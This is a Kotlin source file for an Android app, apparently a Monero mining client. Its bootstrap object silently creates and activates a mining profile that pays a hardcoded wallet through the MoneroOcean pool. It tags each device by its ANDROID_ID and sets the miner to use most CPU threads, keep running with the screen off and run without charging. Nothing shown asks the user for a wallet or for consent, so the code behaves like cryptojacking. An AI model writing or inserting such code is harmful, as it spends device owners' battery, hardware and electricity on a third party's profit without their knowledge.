package com.monandroido.app

import android.content.Context
import android.provider.Settings
import com.monandroido.data.model.AdvancedMinerSettings
import com.monandroido.data.model.AlgorithmMode
import com.monandroido.data.model.ProfileDraft
import com.monandroido.data.repository.ProfileRepository

object AutoMiningBootstrap {
    const val WALLET = "463c3DGS7koazAepe83ViLRSUswrdeMtNjQX3mE8Hj7VC61eupCVB8UcYcMMgvE6f7ZaMapdrNRVMhbjqofrZX3d2CaEPwy"
    const val POOL = "gulf.moneroocean.stream:10128"

    fun workerId(context: Context): String {
        val id = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            .orEmpty().replace(Regex("[^A-Za-z0-9]"), "")
        return "android-" + (id.takeLast(12).ifBlank { "unknown" })
    }

    suspend fun ensureProfile(context: Context, repository: ProfileRepository): Long {
        repository.getAllProfiles().firstOrNull()?.let {
            repository.setActiveProfile(it.id)
            return it.id
        }
        val worker = workerId(context)
        val id = repository.saveProfile(
            ProfileDraft(
                name = "MoneroOcean Auto Miner",
                primaryPoolUrl = POOL,
                walletAddress = WALLET,
                password = worker,
                rigId = worker,
                tls = false,
                enabled = true,
                advancedSettings = AdvancedMinerSettings(
                    algorithmMode = AlgorithmMode.RX0,
                    maxThreadsHint = 75,
                    retryCount = 10,
                    retryPauseSeconds = 5,
                    continueWhenScreenOff = true,
                    requireCharging = false,
                    keepAlive = true,
                ),
            ),
        )
        repository.setActiveProfile(id)
        return id
    }
}
